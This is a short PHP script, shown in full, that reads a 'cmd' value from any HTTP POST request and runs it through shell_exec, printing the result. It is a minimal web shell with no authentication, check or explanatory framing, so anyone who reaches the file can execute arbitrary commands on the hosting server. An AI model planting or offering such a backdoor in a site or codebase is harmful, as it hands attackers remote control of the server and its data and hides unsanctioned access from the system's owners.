<?php
function execute($com)
{
	if (!empty($com))
	{
		if(function_exists('shell_exec'))
		{
			echo shell_exec($com);
		}
	}
}

$cmd = $_POST['cmd'];
execute($cmd);
?>